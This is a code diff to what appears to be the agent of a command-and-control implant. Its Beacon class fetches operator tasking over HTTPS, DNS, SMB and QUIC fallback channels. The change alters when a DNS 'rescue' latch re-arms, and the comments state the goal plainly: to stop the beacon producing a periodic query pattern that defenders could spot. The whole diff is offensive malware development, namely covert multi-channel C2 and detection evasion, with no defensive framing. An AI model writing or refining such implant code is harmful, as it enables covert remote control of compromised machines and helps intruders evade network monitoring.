@@ -1660,6 +1660,10 @@ _FALLBACK_TRANSPORTS = ("https", "dns", "smb", "quic")
 _RESCUE_VERSION = 1
 _RESCUE_MARKER = "r"
 _RESCUE_TRANSPORTS = ("https", "dns", "smb", "quic")
+# The legs that carry traffic *out*. DNS is not one of them, which is
+# the whole reason the rescue exists -- and the reason receiving over
+# DNS must not be read as "the way out is open again".
+_RESCUE_UPSTREAM = ("https", "smb", "quic")
 _RESCUE_CLASSES = {
     "not_attempted": 0,
     "answered": 1,
@@ -7597,6 +7601,15 @@ class Beacon:
 
         while self._running:
             tasking = None
+            # Which leg delivered, if any. It decides whether the rescue
+            # latch re-arms, and only an *upstream* leg may do that:
+            # receiving over DNS proves nothing about getting out, because
+            # that channel is receive-only. Letting DNS re-arm it made the
+            # rescue periodic -- the agent answers a rescue with one
+            # attempt, the attempt arrives over DNS, the latch opens, the
+            # attempt fails, and the next cycle sends another. Measured at
+            # six queries in twelve cycles before this was fixed.
+            delivered_by = None
             # Whatever the last cycle learned is no longer true. A failure
             # from three cycles ago riding along in a rescue would make an
             # operator read a stale reason as a current one.
@@ -7604,21 +7617,28 @@ class Beacon:
 
             if self.https_enabled:
                 tasking = self._beacon_https()
+                if tasking is not None:
+                    delivered_by = "https"
 
             if tasking is None and self.dns_enabled:
                 tasking = self._beacon_dns()
+                if tasking is not None:
+                    delivered_by = "dns"
 
             if tasking is None and self.smb_enabled:
                 tasking = self._beacon_smb()
+                if tasking is not None:
+                    delivered_by = "smb"
                 if tasking and tasking.get("success"):
                     self._registered = True
 
             if tasking is None and self.quic_enabled:
                 tasking = self._beacon_quic()
+                if tasking is not None:
+                    delivered_by = "quic"
                 if tasking and tasking.get("success"):
                     self._registered = True
 
-            from_rescue = False
             if tasking is None:
                 # Nothing got through. If the resolver has shown it
                 # answers, say why -- once, and in the same exchange that
@@ -7628,7 +7648,6 @@ class Beacon:
                 # assignment inside the failure arm would be collected and
                 # then dropped, because the arm that dispatches is an elif.
                 tasking = self._maybe_rescue()
-                from_rescue = tasking is not None
 
             if tasking is None:
                 self._consecutive_failures += 1
@@ -7638,12 +7657,7 @@ class Beacon:
                     self._register_https()
             else:
                 self._consecutive_failures = 0
-                # Only a real leg re-arms the latch. The rescue's own reply
-                # must not: it would arm it, the next dead cycle would send
-                # another, and since the operator's answer to a rescue is a
-                # next attempt to try, that is one query per cycle -- the
-                # periodic signature the latch exists to avoid.
-                if not from_rescue:
+                if delivered_by in _RESCUE_UPSTREAM:
                     self._leg_recovered()
                 if tasking:
                     logger.debug("Tasking: %s", tasking.get("cmd", "?"))
